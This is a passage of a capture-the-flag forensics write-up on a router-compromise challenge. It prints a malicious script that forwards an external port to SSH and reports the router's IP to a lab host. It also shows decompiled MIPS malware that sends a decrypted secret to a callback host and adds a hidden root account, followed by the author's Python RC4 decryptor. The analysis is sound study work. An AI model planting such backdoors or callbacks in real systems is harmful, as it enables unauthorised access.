</span></span><span style="display:flex;"><span>WAN_IP<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>ip -4 -o addr show pppoe-wan | awk <span style="color:#e6db74">&#39;{print $4}&#39;</span> | cut -d <span style="color:#e6db74">&#34;/&#34;</span> -f 1<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>ROUTER_IP<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>ip -4 -o addr show br-lan | awk <span style="color:#e6db74">&#39;{print $4}&#39;</span> | cut -d <span style="color:#e6db74">&#34;/&#34;</span> -f 1<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>CONFIG<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;config redirect         \n\t
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	option dest &#39;lan&#39;           \n\t
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	option target &#39;DNAT&#39;        \n\t
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	option name &#39;share&#39;         \n\t
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	option src &#39;wan&#39;            \n\t
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	option src_dport &#39;61337&#39;    \n\t
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	option dest_port &#39;22&#39;       \n\t
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	option family &#39;ipv4&#39;        \n\t
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	list proto &#39;tcpudp&#39;         \n\t
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	option dest_ip &#39;</span><span style="color:#e6db74">${</span>ROUTER_IP<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>echo -e $CONFIG &gt;&gt; /etc/config/firewall
</span></span><span style="display:flex;"><span>/etc/init.d/firewall restart
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>curl -X POST -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> -b <span style="color:#e6db74">&#34;auth_token=SFRCe1owbWIxM3NfaDR2M19pbmY&#34;</span> -d <span style="color:#e6db74">&#39;{&#34;ip&#34;:&#34;&#39;</span><span style="color:#e6db74">${</span>WAN_IP<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;}&#39;</span> http://configs.router.htb/reanimat
</span></span><span style="display:flex;"><span>eav@tokyo:~/ctf/htb-university-ctf/for/configs
</span></span><span style="display:flex;"><span>$
</span></span></code></pre></div><p>hmmm wait a minute that auth token looks awfully like base64 encoding lets take a look&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>av@tokyo:~/ctf/htb-university-ctf/for/configs
</span></span><span style="display:flex;"><span>$ echo <span style="color:#e6db74">&#34;SFRCe1owbWIxM3NfaDR2M19pbmY&#34;</span>|base64 -d
</span></span><span style="display:flex;"><span>HTB<span style="color:#f92672">{</span>Z0mb13s_h4v3_inf
</span></span><span style="display:flex;"><span>av@tokyo:~/ctf/htb-university-ctf/for/configs
</span></span><span style="display:flex;"><span>$
</span></span></code></pre></div><p>that looks like our flag but only a part of it we are getting closer!!!</p>
<p>lets look at dead_reanimated in ghidra:</p>
<p>main function</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>undefined4 <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> sVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>decrypted;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> curl_easy_handle;
</span></span><span style="display:flex;"><span>  FILE <span style="color:#f92672">*</span>pFVar2;
</span></span><span style="display:flex;"><span>  __uid_t _Var3;
</span></span><span style="display:flex;"><span>  passwd <span style="color:#f92672">*</span>ppVar4;
</span></span><span style="display:flex;"><span>  undefined4 uVar5;
</span></span><span style="display:flex;"><span>  undefined uStack_169;
</span></span><span style="display:flex;"><span>  undefined4 local_168;
</span></span><span style="display:flex;"><span>  undefined auStack_164 [<span style="color:#ae81ff">252</span>];
</span></span><span style="display:flex;"><span>  undefined key [<span style="color:#ae81ff">44</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> CipherText [<span style="color:#ae81ff">28</span>];
</span></span><span style="display:flex;"><span>  undefined4 uStack_20;
</span></span><span style="display:flex;"><span>  undefined4 local_1c;
</span></span><span style="display:flex;"><span>  undefined4 local_18;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  uStack_20._0_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;z&#39;</span>;
</span></span><span style="display:flex;"><span>  uStack_20._1_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;o&#39;</span>;
</span></span><span style="display:flex;"><span>  uStack_20._2_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;m&#39;</span>;
</span></span><span style="display:flex;"><span>  uStack_20._3_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;b&#39;</span>;
</span></span><span style="display:flex;"><span>  local_1c._0_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;i&#39;</span>;
</span></span><span style="display:flex;"><span>  local_1c._1_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;e&#39;</span>;
</span></span><span style="display:flex;"><span>  local_1c._2_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;_&#39;</span>;
</span></span><span style="display:flex;"><span>  local_1c._3_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;l&#39;</span>;
</span></span><span style="display:flex;"><span>  local_18._0_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;o&#39;</span>;
</span></span><span style="display:flex;"><span>  local_18._1_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;r&#39;</span>;
</span></span><span style="display:flex;"><span>  local_18._2_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;d&#39;</span>;
</span></span><span style="display:flex;"><span>  local_18._3_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memcpy</span>(key,<span style="color:#e6db74">&#34;d2c0ba035fe58753c648066d76fa793bea92ef29&#34;</span>,<span style="color:#ae81ff">0x29</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memcpy</span>(CipherText,<span style="color:#f92672">&amp;</span>DAT_00400d50,<span style="color:#ae81ff">0x1b</span>);
</span></span><span style="display:flex;"><span>  sVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(CipherText);
</span></span><span style="display:flex;"><span>  decrypted <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(sVar1 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">init_crypto_lib</span>(key,CipherText,decrypted);
</span></span><span style="display:flex;"><span>  curl_easy_handle <span style="color:#f92672">=</span> <span style="color:#a6e22e">curl_easy_init</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (curl_easy_handle <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    uVar5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xfffffffe</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">curl_easy_setopt</span>(curl_easy_handle,<span style="color:#ae81ff">0x2712</span>,<span style="color:#e6db74">&#34;http://callback.router.htb&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">curl_easy_setopt</span>(curl_easy_handle,<span style="color:#ae81ff">0x271f</span>,decrypted);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">curl_easy_perform</span>(curl_easy_handle);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">curl_easy_cleanup</span>(curl_easy_handle);
</span></span><span style="display:flex;"><span>    pFVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;/proc/sys/kernel/hostname&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);
</span></span><span style="display:flex;"><span>    local_168 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(auStack_164,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0xfc</span>);
</span></span><span style="display:flex;"><span>    sVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>(<span style="color:#f92672">&amp;</span>local_168,<span style="color:#ae81ff">0x100</span>,<span style="color:#ae81ff">1</span>,pFVar2);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fclose</span>(pFVar2);
</span></span><span style="display:flex;"><span>    (<span style="color:#f92672">&amp;</span>uStack_169)[sVar1] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    curl_easy_handle <span style="color:#f92672">=</span> <span style="color:#a6e22e">strcmp</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_168,<span style="color:#e6db74">&#34;HSTERUNI-GW-01&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (curl_easy_handle <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>      _Var3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">getuid</span>();
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ((_Var3 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">||</span> (_Var3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">geteuid</span>(), _Var3 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)) {
</span></span><span style="display:flex;"><span>        ppVar4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">getpwnam</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>uStack_20);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (ppVar4 <span style="color:#f92672">==</span> (passwd <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">system</span>(
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;opkg update &amp;&amp; opkg install shadow-useradd &amp;&amp; useradd -s /bin/ash -g 0 -u 0 -o -M z ombie_lord&#34;</span>
</span></span><span style="display:flex;"><span>                );
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        pFVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">popen</span>(<span style="color:#e6db74">&#34;passwd zombie_lord&#34;</span>,<span style="color:#e6db74">&#34;w&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fprintf</span>(pFVar2,<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,decrypted,decrypted);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pclose</span>(pFVar2);
</span></span><span style="display:flex;"><span>        uVar5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        uVar5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      uVar5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> uVar5;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>undefined4 <span style="color:#a6e22e">init_crypto_lib</span>(undefined4 param_1,undefined4 param_2,undefined4 param_3)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  undefined auStack_110 [<span style="color:#ae81ff">260</span>];
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">key_rounds_init</span>(param_1,auStack_110);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">perform_rounds</span>(auStack_110,param_2,param_3);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/* WARNING: Removing unreachable block (ram,0x00400af4) */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>undefined4 <span style="color:#a6e22e">key_rounds_init</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>param_1,undefined <span style="color:#f92672">*</span>param_2)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  byte bVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> key_len;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar2;
</span></span><span style="display:flex;"><span>  undefined <span style="color:#f92672">*</span>out_buf;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar3;
</span></span><span style="display:flex;"><span>  byte <span style="color:#f92672">*</span>pbVar4;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar5;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  key_len <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(param_1);
</span></span><span style="display:flex;"><span>  iVar2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  out_buf <span style="color:#f92672">=</span> param_2;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>out_buf <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span>)iVar2;
</span></span><span style="display:flex;"><span>    iVar2 <span style="color:#f92672">=</span> iVar2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    out_buf <span style="color:#f92672">=</span> param_2 <span style="color:#f92672">+</span> iVar2;
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">while</span> (iVar2 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x100</span>);
</span></span><span style="display:flex;"><span>  iVar2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  iVar3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span>    iVar5 <span style="color:#f92672">=</span> iVar2 <span style="color:#f92672">%</span> (<span style="color:#66d9ef">int</span>)key_len;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (key_len <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">trap</span>(<span style="color:#ae81ff">0x1c00</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    pbVar4 <span style="color:#f92672">=</span> param_2 <span style="color:#f92672">+</span> iVar2;
</span></span><span style="display:flex;"><span>    bVar1 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>pbVar4;
</span></span><span style="display:flex;"><span>    iVar2 <span style="color:#f92672">=</span> iVar2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    iVar3 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>)((<span style="color:#66d9ef">int</span>)param_1[iVar5] <span style="color:#f92672">+</span> (uint)bVar1 <span style="color:#f92672">+</span> iVar3) <span style="color:#f92672">%</span> <span style="color:#ae81ff">0x100</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>pbVar4 <span style="color:#f92672">=</span> param_2[iVar3];
</span></span><span style="display:flex;"><span>    param_2[iVar3] <span style="color:#f92672">=</span> bVar1;
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">while</span> (iVar2 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x100</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>undefined4 <span style="color:#a6e22e">perform_rounds</span>(<span style="color:#66d9ef">int</span> param_1,<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>param_2,<span style="color:#66d9ef">int</span> param_3)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> len;
</span></span><span style="display:flex;"><span>  byte <span style="color:#f92672">*</span>state_p;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> i;
</span></span><span style="display:flex;"><span>  uint p;
</span></span><span style="display:flex;"><span>  uint q;
</span></span><span style="display:flex;"><span>  byte r;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  len <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(param_2);
</span></span><span style="display:flex;"><span>  q <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  p <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">!=</span> len; i <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> p <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>;
</span></span><span style="display:flex;"><span>    state_p <span style="color:#f92672">=</span> (byte <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> p);
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>state_p;
</span></span><span style="display:flex;"><span>    q <span style="color:#f92672">=</span> r <span style="color:#f92672">+</span> q <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>state_p <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(byte <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> q);
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(byte <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> q) <span style="color:#f92672">=</span> r;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(byte <span style="color:#f92672">*</span>)(param_3 <span style="color:#f92672">+</span> i) <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(byte <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> ((uint)r <span style="color:#f92672">+</span> (uint)<span style="color:#f92672">*</span>state_p <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>)) <span style="color:#f92672">^</span> param_2[i];
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>code explaination:</p>
<p>After Looking at the program for about 5 minutes i knew our flag was probably that decrypted variable so i just started to reimplement the whole  <code>init_crypto_lib</code> function in python3 &hellip;. i took chatgpt&rsquo;s help and it told me it was using RC4 symmetric key algorithm &hellip;. when i asked it to implement the <code>key_rounds_init</code> and <code>perform_rounds</code> function in python it was successfully able to reimplement the key_rounds_init function but failed to implement he perform_rounds function so i wrote that function looking at ghidra&rsquo;s decompilation</p>
<p>here is my script:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./dead_reanimated_mNmZTMtNjU3YS00&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cipher <span style="color:#f92672">=</span> e<span style="color:#f92672">.</span>read(<span style="color:#ae81ff">0x0400d50</span>,<span style="color:#ae81ff">0x1b</span>)
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;d2c0ba035fe58753c648066d76fa793bea92ef29&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">key_rounds_init</span>(key, state):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  key_len <span style="color:#f92672">=</span> len(key)
</span></span><span style="display:flex;"><span>  i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">256</span>:
</span></span><span style="display:flex;"><span>    state[i] <span style="color:#f92672">=</span> i
</span></span><span style="display:flex;"><span>    i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>  k <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
</span></span><span style="display:flex;"><span>    j <span style="color:#f92672">=</span> (j <span style="color:#f92672">+</span> state[i] <span style="color:#f92672">+</span> ord(key[i <span style="color:#f92672">%</span> key_len])) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>
</span></span><span style="display:flex;"><span>    state[i], state[j] <span style="color:#f92672">=</span> state[j], state[i]
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">perform_rounds</span>(state, data, out_buf):
</span></span><span style="display:flex;"><span>  i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>  q<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>  p <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>  quit <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,len(data)):
</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> (p <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>
</span></span><span style="display:flex;"><span>    state_p<span style="color:#f92672">=</span>state[p]
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">=</span>state[p]
</span></span><span style="display:flex;"><span>    q<span style="color:#f92672">=</span>(r<span style="color:#f92672">+</span>q) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>
</span></span><span style="display:flex;"><span>    state[p]<span style="color:#f92672">=</span>state[q]
</span></span><span style="display:flex;"><span>    state[q]<span style="color:#f92672">=</span>r
</span></span><span style="display:flex;"><span>    out_buf[i]<span style="color:#f92672">=</span>(state[state_p<span style="color:#f92672">+</span>state[p]<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xff</span>]<span style="color:#f92672">^</span>data[i])
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> out_buf
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Example usage</span>
</span></span><span style="display:flex;"><span>state <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">256</span>
</span></span><span style="display:flex;"><span>key_rounds_init(key, state)
</span></span><span style="display:flex;"><span>out_buf<span style="color:#f92672">=</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">256</span>
</span></span><span style="display:flex;"><span>perform_rounds(state, cipher, out_buf)
</span></span><span style="display:flex;"><span>print(out_buf)
</span></span><span style="display:flex;"><span>print(len(out_buf))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> out_buf:
</span></span><span style="display:flex;"><span>  print(chr(i),end<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>)
</span></span></code></pre></div><p>Output:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>av@tokyo:~/ctf/htb-university-ctf/for/configs
</span></span><span style="display:flex;"><span>$ python3 cry.py
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/av/ctf/htb-university-ctf/for/configs/dead_reanimated_mNmZTMtNjU3YS00&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:     mips-32-little
</span></span><span style="display:flex;"><span>    RELRO:    No RELRO
</span></span><span style="display:flex;"><span>    Stack:    No canary found
</span></span><span style="display:flex;"><span>    NX:       NX enabled
</span></span><span style="display:flex;"><span>    PIE:      No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>51, 99, 116, 51, 100, 95, 48, 117, 114, 95, 99, 48, 109, 109, 117, 110, 49, 99, 52, 116, 49, 48, 110, 115, 33, 33, 125, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">256</span>
